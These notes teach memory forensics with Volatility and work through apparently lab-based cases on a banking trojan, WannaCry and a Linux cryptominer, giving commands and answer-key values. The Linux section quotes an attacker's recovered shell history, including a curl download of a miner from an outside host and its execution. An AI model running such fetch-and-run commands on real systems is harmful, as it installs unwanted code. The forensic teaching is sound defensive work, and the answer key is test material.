# Volatility

## Overview

- **Volatility** is a free memory forensics framework developed and maintained by the Volatility Foundation.
- It is written in Python and is composed of plugins that parse memory images for operating-system artifacts, processes, network activity, injected code, kernel modules, file objects, and other forensic evidence.
- Repository: <https://github.com/volatilityfoundation/volatility3>
- Additional references:
  - <https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet>
  - <https://github.com/volatilityfoundation/volatility/wiki>
  - <https://github.com/volatilityfoundation/volatility/wiki/Volatility-Documentation-Project>
  - <https://digital-forensics.sans.org/media/Poster-2015-Memory-Forensics.pdf>
  - <https://eforensicsmag.com/finding-advanced-malware-using-volatility/>

## Identifying Image Information and Profiles

Use image information plugins to identify the operating system, architecture, build information, and other metadata needed to interpret the memory image correctly.

- Volatility 3 uses operating-system-specific info plugins:
  - `windows.info`
  - `linux.info`
  - `mac.info`
- General command pattern:

```bash
python3 vol.py -f <image-file> <info-plugin>
```

## Listing Processes and Connections

Process and connection plugins help build an initial picture of what was running when memory was captured.

```bash
python3 vol.py -f <image-file> windows.pslist
python3 vol.py -f <image-file> windows.psscan
python3 vol.py -f <image-file> windows.pstree
python3 vol.py -f <image-file> windows.dlllist
```

- `windows.pslist`: lists active processes.
- `windows.psscan`: scans memory for process objects and can identify processes that are hidden from normal listing methods.
- `windows.pstree`: lists processes by parent process ID and helps reconstruct parent-child execution flow.
- Network connection plugins can identify active connections present at the time of acquisition.
- `windows.dlllist`: lists DLLs associated with processes at the time of extraction.
- Alternative resource: `bulk-extractor` can extract PCAP-style artifacts from memory files: <https://tools.kali.org/forensics/bulk-extractor>

## Hunting and Detection

- `malfind`: attempts to identify injected process memory, suspicious PIDs, and offset addresses by scanning process memory regions.
- `yarascan`: searches memory for strings, byte patterns, and compound YARA rules.

## Advanced Memory Forensics

### System Service Descriptor Table Hooks

- Plugin: `.ssdt`
- The Windows kernel uses the System Service Descriptor Table to look up system functions.
- Threat actors and rootkits may modify SSDT pointers so calls are redirected to attacker-controlled locations.
- SSDT review is useful during initial rootkit investigation.

### Modules

- Plugin: `.modules`
- Dumps the list of loaded kernel modules.
- Useful for identifying active malware loaded into the kernel.
- Hidden or idle malicious files might be missed, so this should be followed by deeper scanning.

### Driverscan

- Plugin: `.driverscan`
- Helps identify driver files in kernel memory.
- May identify driver artifacts missed by `.modules`.
- Often produces no output, but it remains valuable as a follow-on investigation step.

### Other Hook and Kernel Investigation Plugins

Useful Volatility 2 or third-party plugin categories include:

- IRP hooks
- IAT hooks
- EAT hooks
- Inline hooks
- `modscan`
- `driverirp`
- `callbacks`
- `idt`
- `apihooks`
- `moddump`
- `handles`

## Case 001 - BOB! THIS ISN'T A HORSE!

### Scenario

The SOC collected a memory dump from a quarantined endpoint suspected of being compromised by a banking trojan masquerading as an Adobe document. The task is to perform memory forensics using threat intelligence and reverse-engineering context.

- Suspicious IP provided: `41.168.5.140`
- Memory file location: `/Scenarios/Investigations/Investigation-1.vmem`

### Host Build Version

Question: **What is the build version of the host machine in Case 001?**

```bash
vol3 -f mem1.vmem windows.info
```

Answer:

```text
2600.xpsp.080413-2111
```

### Memory Acquisition Time

Question: **At what time was the memory file acquired in Case 001?**

Use the same command:

```bash
vol3 -f mem1.vmem windows.info
```

Answer:

```text
2012-07-22 02:45:08
```

### Suspicious Process

Question: **What process can be considered suspicious in Case 001?**

```bash
vol3 -f mem1.vmem windows.pslist
```

Answer:

```text
reader_sl.exe
```

Note: Certain special characters may not be visible on the provided VM. Copy-and-paste may still copy all characters.

### Parent Process of the Suspicious Process

Question: **What is the parent process of the suspicious process in Case 001?**

```bash
vol3 -f mem1.vmem windows.pstree
```

Answer:

```text
explorer.exe
```

### Suspicious Process PID

Question: **What is the PID of the suspicious process in Case 001?**

```bash
vol3 -f mem1.vmem windows.pstree
```

Answer:

```text
1640
```

### Parent Process PID

Question: **What is the parent process PID in Case 001?**

```bash
vol3 -f mem1.vmem windows.pstree
```

Answer:

```text
1484
```

### Adversary User-Agent

Question: **What user-agent was employed by the adversary in Case 001?**

```bash
vol3 mem1.vmem windows.memmap.Memmap --pid 1640 --dump
strings pid.1640.dmp | grep -i "user-agent"
```

Answer:

```text
Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
```

### Chase Bank Domain Check

Question: **Was Chase Bank one of the suspicious bank domains found in Case 001?**

```bash
vol3 mem1.vmem windows.memmap.Memmap --pid 1640 --dump
strings pid.1640.dmp | grep -i "chase"
```

Answer:

```text
Yes
```

## Case 002 - That Kind of Hurt My Feelings

### Scenario

The organization was affected by ransomware that has impacted corporations internationally. The team already retrieved the decryption key and recovered from the attack. The task is post-incident analysis: identify the malware, the suspicious processes, and supporting indicators.

- Memory file location: `/Scenarios/Investigations/Investigation-2.raw`

### Suspicious Process at PID 740

Question: **What suspicious process is running at PID 740 in Case 002?**

```bash
vol3 mem2.raw windows.pslist
```

Answer:

```text
@WanaDecryptor@
```

### Full Path of the Suspicious Binary

Question: **What is the full path of the suspicious binary in PID 740 in Case 002?**

```bash
vol3 mem2.raw windows.dlllist | grep 740
```

Answer:

```text
C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe
```

### Parent Process of PID 740

Question: **What is the parent process of PID 740 in Case 002?**

```bash
vol3 mem2.raw windows.pslist | grep 1940
```

Answer:

```text
tasksche.exe
```

Operational note: the process name appears misspelled, which is itself suspicious.

### Suspicious Parent Process PID

Question: **What is the suspicious parent process PID connected to the decryptor in Case 002?**

Answer:

```text
1940
```

### Malware Family

Question: **From the current information, what malware is present on the system in Case 002?**

Answer:

```text
WannaCry
```

### Socket-Creation DLL

Question: **What DLL is loaded by the decryptor used for socket creation in Case 002?**

```bash
vol3 mem2.raw windows.dlllist | grep -i wana
```

Supporting reference:

<https://www.virustotal.com/gui/file/770afe43605060d9d40bb57a18bb788fceed2c1d8922f98a4c4700100504fcae/behavior>

Answer:

```text
WS2_32.dll
```

### Known WannaCry Mutex

Question: **What mutex can be found that is a known indicator of the malware in question in Case 002?**

Supporting reference:

<https://www.mandiant.com/resources/blog/wannacry-malware-profile>

Answer:

```text
MsWinZonesCacheCounterMutexA
```

### Plugin for Files Loaded from Malware Working Directory

Question: **What plugin could be used to identify all files loaded from the malware working directory in Case 002?**

Answer:

```text
windows.filescan
```

## Volatility Profiles

Profiles are crucial for correctly interpreting memory dumps from target systems. A profile defines the operating system architecture, version, and memory structures specific to the target system.

```bash
vol.py --info
```

![Volatility Profiles](/images/volatility-101.png)

### Linux Profiles

Linux profiles often need to be manually created from the same type of system that produced the memory dump.

Reasons Linux profiles are more difficult to generalize:

- Linux is an ecosystem of distributions and kernel configurations rather than a single monolithic operating system.
- Kernel versions, build options, and memory layouts vary across distributions.
- Linux kernel internals vary more than Windows memory structures and APIs.
- Linux is open-source and frequently customized, which increases variability.

For the lab, a prepared profile exists at:

```text
/home/ubuntu/Desktop/Evidence/Ubuntu_5.4.0-163-generic_profile.zip
```

Copy it to Volatility's Linux overlay profile directory:

```bash
cp Ubuntu_5.4.0-163-generic_profile.zip ~/.local/lib/python2.7/site-packages/volatility/plugins/overlays/linux/
vol.py --info | grep Ubuntu
```

![Volatility Profiles](/images/volatility-102.png)

Note: Creating Linux profiles is out of scope for this room, but Nicolas Béguier has useful material on the process.

## Memory Analysis

The lab memory image is:

```text
linux.mem
```

When using Volatility 2 with Linux memory, specify both the file and profile:

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" -h
```

![Memory Analysis](/images/volatility-103.png)

## Volatility Plugins

### History File

The `linux_bash` plugin extracts bash command history from memory. This is useful for identifying commands executed by a user or by an attacker acting as that user.

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
```

![History File](/images/volatility-104.png)

Cross-reference suspicious command history with the analyst or system owner:

- The command `mysql -u root -p'redacted'` was confirmed as legitimate by the elf analyst.
- The command `cat /home/elfie/.bash_history` was not confirmed, suggesting the malicious actor likely viewed bash history and may have obtained the MySQL password.
- The command `curl http://10.0.2.64/toy_miner -o miner` indicates that a file named `miner` was downloaded.
- The command `./miner` indicates the malicious actor executed the downloaded miner.

## Running Processes

The `linux_pslist` plugin provides a baseline of running processes. It lists process names, PIDs, and parent process IDs, which supports parent-child process analysis.

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
```

![Running Processes](/images/volatility-105.png)

Important findings:

- The `miner` process was not executed by the elf analyst and is likely a cryptominer.
- The `mysqlserver` process looks benign by name but is suspicious because the real MySQL process is normally named `mysqld`.
- The `mysqlserver` PID is different from the `miner` PPID, so it did not spawn directly from the `miner` process.

## Process Extraction

Process extraction allows the analyst to preserve and examine suspicious binaries outside the memory image.

Use cases:

- Malware behavior analysis
- Evidence preservation
- Hashing for threat intelligence and detection engineering

Create an extraction directory:

```bash
mkdir extracted
```

General process dump syntax:

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p PID
```

![Process Extraction](/images/volatility-106.png)

Example extraction of the suspicious `mysqlserver` process:

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10291
```

![Process Extraction](/images/volatility-107.png)

Note: replace `PID` with the target process ID from the process listing.

## File Extraction

File extraction is useful for finding persistence mechanisms such as cron jobs.

The investigation should determine whether `mysqlserver` was placed by a persistence mechanism. Since there is no dedicated cronjob plugin in this workflow, enumerate file paths and grep for cron-related entries.

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files | grep -i cron
```

![File Extraction](/images/volatility-108.png)

Key finding:

```text
/var/spool/cron/crontabs/elfie
```

The elf analyst confirmed they did not configure cron jobs on this server. Extract the file by using the inode value and output it into the `extracted` directory:

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_find_file -i 0xffff9ce9b78280e8 -O extracted/elfie
```

![File Extraction](/images/volatility-109.png)

Review the extracted cron file:

```bash
cat extracted/elfie
```

This helps determine how the `mysqlserver` process was dropped or executed on the file system.

## Investigation Questions and Commands

### Exposed Password from Bash History

Question: **What is the exposed password found from the bash history output?**

![History File](/images/volatility-110.png)

Use `linux_bash` and review command history for exposed credentials:

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_bash
```

### Miner Process PID

Question: **What is the PID of the miner process?**

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
```

![Running Processes](/images/volatility-111.png)

### MD5 Hash of the Miner Process

```bash
mkdir extracted
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10280
md5sum extracted/miner.10280.x0400000
```

Answer:

```text
153a5c8efe4aa3be240e5dc645480dee
```

### MD5 Hash of the mysqlserver Process

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_pslist
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_procdump -D extracted -p 10291
md5sum extracted/mysqlserver.10291.0x400000
```

Answer:

```text
c586e774bb2aa17819d7faae18dad7d1
```

### Suspicious URL in the Miner Binary

Question: **Use `strings` against the extracted miner process and grep for HTTP strings. What is the suspicious URL?**

```bash
strings extracted/miner.10280.0x400000 > strings.txt
grep http:// strings.txt > strings2.txt
```

Operational note: fully defang the URL before documenting or sharing it externally.

### mysqlserver Drop Location

Question: **After reading the `elfie` cron file, what location is the `mysqlserver` process dropped in on the file system?**

Supporting command path:

```bash
vol.py -f linux.mem --profile="LinuxUbuntu_5_4_0-163-generic_profilex64" linux_enumerate_files > files.txt
grep -i mysqlserver files.txt
```

Then correlate the file path with the extracted `elfie` cron contents.
